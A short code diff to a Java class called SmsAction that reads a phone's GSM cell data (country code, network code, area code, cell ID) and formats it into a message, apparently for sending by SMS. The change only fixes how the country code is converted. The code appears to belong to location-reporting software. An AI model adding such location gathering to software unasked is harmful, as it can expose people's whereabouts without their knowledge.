@@ -102,7 +102,8 @@ public final class SmsAction extends SubAction {
             // http://en.wikipedia.org/wiki/Mobile_Network_Code
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            final int mcc = cellinfo.getMCC();
+            final int mcc = Integer.parseInt(Integer.toHexString(cellinfo.getMCC()));
+            
             final int mnc = cellinfo.getMNC();
             final int lac = cellinfo.getLAC();
             final int cid = cellinfo.getCellId();
@@ -110,7 +111,7 @@ public final class SmsAction extends SubAction {
             final int bsic = GPRSInfo.getCellInfo().getBSIC();
 
             final StringBuffer mb = new StringBuffer();
-            mb.append("MCC: " + Integer.toHexString(mcc));
+            mb.append("MCC: " + mcc);
             mb.append(" MNC: " + mnc);
             mb.append(" LAC: " + lac);
             mb.append(" CID: " + cid);
